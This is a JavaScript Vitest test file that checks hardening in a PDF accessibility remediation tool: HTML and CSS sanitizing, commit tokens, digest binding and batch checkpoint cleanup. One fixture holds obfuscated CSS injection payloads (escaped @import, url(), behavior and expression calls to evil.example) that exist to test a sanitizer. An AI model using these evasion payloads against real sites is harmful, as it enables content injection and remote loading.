import { describe, it, expect } from 'vitest';
import { readFileSync } from 'node:fs';
import { resolve } from 'node:path';

const read = (name) => readFileSync(resolve(process.cwd(), name), 'utf8');
const pipe = read('doc_pipeline_source.jsx');
const view = read('view_pdf_audit_source.jsx');
const host = read('AlloFlowANTI.txt');
const preview = read('view_export_preview_source.jsx');
const occurrences = (text, needle) => text.split(needle).length - 1;
const plainMarker = view.indexOf('data-help-key="pdf_audit_plain_language_btn"');
const plainHandlerStart = view.indexOf('onClick={async () => {', plainMarker);
const plainHandlerEnd = view.indexOf('}} className=', plainHandlerStart);
if (plainMarker < 0 || plainHandlerStart < 0 || plainHandlerEnd < 0) throw new Error('Plain-language handler markers missing');
const AsyncFunction = Object.getPrototypeOf(async function () {}).constructor;
const runPlainLanguageHandler = new AsyncFunction(
  'pdfFixResult', 'setPlainLangBusy', '_captureAsyncHtmlToken', '_sourceDigestForToken',
  'simplifyAccessibleHtml', 'plainLangLevel', 'setPlainLangProgress', '_commitAsyncHtmlIfCurrent',
  'addToast', 't',
  view.slice(plainHandlerStart + 'onClick={async () => {'.length, plainHandlerEnd)
);
const cssSanitizerStart = pipe.indexOf('function _alloDecodeImportedCss');
const cssSanitizerEnd = pipe.indexOf('function _alloSanitizeRemediationHtml', cssSanitizerStart);
if (cssSanitizerStart < 0 || cssSanitizerEnd < 0) throw new Error('Imported CSS sanitizer markers missing');
const sanitizeImportedCss = new Function(
  pipe.slice(cssSanitizerStart, cssSanitizerEnd) + '\nreturn _alloSanitizeImportedCss;'
)();
const checkpointHelpersStart = pipe.indexOf("const _ACTIVE_BATCH_LEGACY_RESULT_PREFIX");
const checkpointHelpersEnd = pipe.indexOf('const _batchResultSummary', checkpointHelpersStart);
if (checkpointHelpersStart < 0 || checkpointHelpersEnd < 0) throw new Error('Batch checkpoint helper markers missing');
const checkpointHelpers = new Function(
  pipe.slice(checkpointHelpersStart, checkpointHelpersEnd)
    + '\nreturn { normalize: _normalizeBatchCheckpointId, newId: _newBatchCheckpointId, prefixFor: _batchResultPrefixFor, keyFor: _batchResultKeyFor };'
)();
const clearBatchStart = pipe.indexOf('const _clearActiveBatch = async');
const clearBatchEnd = pipe.indexOf('  //', clearBatchStart);
if (clearBatchStart < 0 || clearBatchEnd < 0) throw new Error('Batch checkpoint cleanup markers missing');
const makeClearActiveBatch = (storageDB, idbKeyval) => new Function(
  'storageDB', 'window', '_batchStatusWriteTail', '_normalizeBatchCheckpointId', '_batchResultPrefixFor',
  '_ACTIVE_BATCH_FILES_KEY', '_ACTIVE_BATCH_STATUS_KEY', '_ACTIVE_BATCH_LEGACY_RESULT_PREFIX',
  pipe.slice(clearBatchStart, clearBatchEnd) + '\nreturn _clearActiveBatch;'
)(
  storageDB, { idbKeyval }, Promise.resolve(), checkpointHelpers.normalize, checkpointHelpers.prefixFor,
  'pdf_active_batch_files_v1', 'pdf_active_batch_status_v1', 'pdf_active_batch_result_v2_'
);

describe('remediation deep-dive hardening', () => {
  it('sanitizes every imported remediation HTML lane before commit or Builder preview', () => {
    expect(pipe).toContain("querySelectorAll('script,iframe,frame,object,embed,base,link,meta,svg,math,template')");
    expect(pipe).toContain("if (/^on/i.test(name)");
    expect(pipe).toContain("out._translation = Object.assign({}, out._translation, { html: sanitize(out._translation.html) })");
    expect(pipe).toContain("out._plainLanguage = Object.assign({}, out._plainLanguage, { html: sanitize(out._plainLanguage.html) })");
    expect(pipe).toContain("cleanRange.result = Object.assign({}, cleanRange.result, { accessibleHtml: sanitize(cleanRange.result.accessibleHtml) })");
    expect(occurrences(view, '_viewSanitizeProjectImport(parsedProject, _docPipeline)')).toBe(2);
    expect(host).toContain('const _sanitizedImport = _projectSanitizer(_savedProject);');
    expect(host).toContain('const _safeRemediationHtml = _docPipeline.sanitizeRemediationHtml(pdfFixResult.accessibleHtml);');
    expect(preview).toContain("exportPreviewSource === 'remediation' ? 'allow-same-origin' : 'allow-same-origin allow-scripts allow-forms'");
  });

  it('canonicalizes CSS escapes and comments before removing fetch and execution primitives', () => {
    const hostile = [
      '@\\69mport "https://evil.example/import.css";',
      '@font-f\\000061ce { src: u\\72l("https://evil.example/font.woff2"); }',
      '.safe { color: rgb(1, 2, 3); background-image: u\\72l("https://evil.example/a.png"); }',
      '.split { width: 50%; background: u/**/rl("https://evil.example/b.png"); }',
      '.set { background-image: -webkit-\\69mage-set("https://evil.example/c.png" 1x); }',
      '.old { be\\000068avior: u\\72l("https://evil.example/x.htc"); x: exp\\000072ession(alert(1)); }',
    ].join('\n');
    const clean = sanitizeImportedCss(hostile);
    expect(clean).toContain('color: rgb(1, 2, 3)');
    expect(clean).toContain('width: 50%');
    expect(clean).not.toMatch(/evil\.example|@import|@font-face|url\s*\(|image-set\s*\(|expression\s*\(|behavior\s*:/i);
    expect(sanitizeImportedCss('color: red;' + '\\')).toBe('');
  });

  it('uses compare-and-swap and lifecycle epochs for every long-running UI mutation', () => {
    expect(host).toContain('capturePdfHtmlCommitToken');
    expect(host).toContain('commitPdfFixResultIfCurrent');
    expect(view).toContain('const _commitToken = _captureAsyncHtmlToken();');
    expect(view).toContain('_commitAsyncHtmlIfCurrent(_commitToken');
    expect(host).toContain('const pdfAuditEpochRef = useRef(0);');
    expect(host).toContain('invalidatePdfAuditRun();');
    expect(host).toContain('const _pdfFidelityRepairEpochRef = useRef(0);');
    expect(pipe).toContain("const _auditRunToken = (!_skipUi && typeof _auditHost.beginPdfAuditRun === 'function')");
    expect(pipe).toContain('return _auditCancelled() ? null : triangulated;');
  });

  it('binds companions and resume records to exact SHA-256 source identities', () => {
    expect(pipe).toContain("replace(/\\s+/g, '')");
    expect(pipe).not.toContain("replace(/s+/g, '')");
    expect(pipe).toContain("return 'msdoc_v2_' + digest.slice(7)");
    expect(pipe).toContain('record.documentDigest !== expectedDocumentDigest');
    expect(pipe).toContain('saved.documentDigest === _currentDocKey');
    expect(host).toContain('docKey: _override.docKey || null');
    expect(host).toContain('documentDigest: cur.documentDigest || null');
    expect(view).toContain('sourceDigest: _translationSourceDigest');
    expect(view).toContain('sourceDigest: _plainSourceDigest');
    expect(view).toContain("if (!_requireFreshCompanion(pdfFixResult._translation");
    expect(view).toContain("if (!_requireFreshCompanion(pdfFixResult._plainLanguage");
  });

  it('executes plain-language generation before committing the digest-bound companion', async () => {
    const sourceHtml = '<main><h1>Source</h1><p>Complex sentence.</p></main>';
    const busy = [];
    const progress = [];
    const toasts = [];
    let simplifyCall = null;
    let committed = null;
    await runPlainLanguageHandler(
      { accessibleHtml: sourceHtml },
      (value) => busy.push(value),
      () => ({ revision: 3, html: sourceHtml }),
      async () => 'sha256:source-digest',
      async (html, opts) => {
        simplifyCall = { html, gradeBand: opts.gradeBand };
        opts.onProgress(1, 2);
        return { html: '<main><h1>Source</h1><p>Simple sentence.</p></main>', chunksFailed: 0, chunksTotal: 2 };
      },
      '5-6',
      (value) => progress.push(value),
      (_token, updater) => {
        committed = updater({ accessibleHtml: sourceHtml });
        return true;
      },
      (...args) => toasts.push(args),
      (key) => key
    );
    expect(simplifyCall).toEqual({ html: sourceHtml, gradeBand: '5-6' });
    expect(progress).toEqual(['1/2', '']);
    expect(busy).toEqual([true, false]);
    expect(committed._plainLanguage).toMatchObject({
      html: '<main><h1>Source</h1><p>Simple sentence.</p></main>',
      sourceDigest: 'sha256:source-digest',
      srcLen: sourceHtml.length,
      chunksFailed: 0,
      chunksTotal: 2,
    });
    expect(toasts.some((args) => args[1] === 'success')).toBe(true);
  });

  it('blocks remediation until the pipeline, verification policy, and renderer are ready', () => {
    expect(host).toContain("const remediationModuleNames = ['DocPipelineModule', 'VerificationPolicy', 'DocBuilderRenderer'];");
    expect(host).toContain('remediationReady, remediationDependencyState, retryRemediationDependencies');
    expect(view).toContain('Remediation engine not ready');
    expect(view).toContain('disabled={remediationReady === false}');
    expect(view).toContain('disabled={pdfFixLoading || remediationReady === false}');
    expect(view).toContain('module unavailable|modules? finish loading');
  });

  it('keeps batch status small and safely reruns completed files whose result is unavailable', () => {
    const statusBlock = pipe.slice(pipe.indexOf('const _toStatusEntry'), pipe.indexOf('const _saveBatchFiles'));
    expect(statusBlock).toContain('resultKey:');
    expect(statusBlock).toContain('resultSummary:');
    expect(statusBlock).not.toMatch(/\n\s*result:\s*f\.result/);
    expect(pipe).toContain('const _ACTIVE_BATCH_RESULT_MAX_BYTES = 32 * 1024 * 1024;');
    expect(pipe).toContain('const _ACTIVE_BATCH_RESULTS_MAX_BYTES = 128 * 1024 * 1024;');
    expect(pipe).toContain("? (restoredResult ? 'done' : 'pending')");
    expect(pipe).toContain("const _ACTIVE_BATCH_RESULT_PREFIX = 'pdf_active_batch_result_v3_';");
    expect(pipe).toContain('schemaVersion: 3, batchId: cleanBatchId');
    expect(pipe).toContain('_normalizeBatchCheckpointId(activeFilesRec.batchId) !== cleanBatchId');
    expect(pipe).toContain('if (requestedId && activeId !== requestedId) return false;');
    expect(pipe).not.toContain('key.startsWith(_ACTIVE_BATCH_RESULT_PREFIX)');
    const firstKey = checkpointHelpers.keyFor('batch_first_owner', { id: 'same-file' });
    const secondKey = checkpointHelpers.keyFor('batch_second_owner', { id: 'same-file' });
    expect(firstKey).not.toBe(secondKey);
    expect(checkpointHelpers.normalize(checkpointHelpers.newId())).toBeTruthy();
    expect(checkpointHelpers.normalize('../not-an-owner')).toBeNull();
  });

  it('refuses stale checkpoint cleanup and deletes only the owning batch namespace', async () => {
    const filesKey = 'pdf_active_batch_files_v1';
    const statusKey = 'pdf_active_batch_status_v1';
    const newId = 'batch_new_owner';
    const staleId = 'batch_stale_owner';
    const newResultKey = checkpointHelpers.keyFor(newId, { id: 'shared-file' });
    const staleResultKey = checkpointHelpers.keyFor(staleId, { id: 'shared-file' });
    const values = new Map([
      [filesKey, { batchId: newId, files: [{ id: 'shared-file' }], savedAt: 10 }],
      [statusKey, { batchId: newId, statuses: [{ id: 'shared-file', resultKey: newResultKey }] }],
      [newResultKey, { serialized: '{}' }],
      [staleResultKey, { serialized: '{}' }],
    ]);
    const storageDB = {
      get: async (key) => values.get(key),
      set: async (key, value) => { values.set(key, value); },
    };
    const idbKeyval = {
      keys: async () => Array.from(values.keys()),
      del: async (key) => { values.delete(key); },
    };
    const clear = makeClearActiveBatch(storageDB, idbKeyval);

    await expect(clear(staleId)).resolves.toBe(false);
    expect(values.get(filesKey).batchId).toBe(newId);
    expect(values.has(newResultKey)).toBe(true);
    await expect(clear(newId)).resolves.toBe(true);
    expect(values.get(filesKey)).toBeNull();
    expect(values.get(statusKey)).toBeNull();
    expect(values.has(newResultKey)).toBe(false);
    expect(values.has(staleResultKey)).toBe(true);

    const legacyOwned = 'pdf_active_batch_result_v2_owned';
    const legacyOrphan = 'pdf_active_batch_result_v2_orphan';
    values.set(filesKey, { files: [{ id: 'legacy' }], savedAt: 20 });
    values.set(statusKey, { schemaVersion: 2, statuses: [{ id: 'legacy', resultKey: legacyOwned }] });
    values.set(legacyOwned, { serialized: '{}' });
    values.set(legacyOrphan, { serialized: '{}' });
    await expect(clear(null)).resolves.toBe(true);
    expect(values.has(legacyOwned)).toBe(false);
    expect(values.has(legacyOrphan)).toBe(true);
  });
});

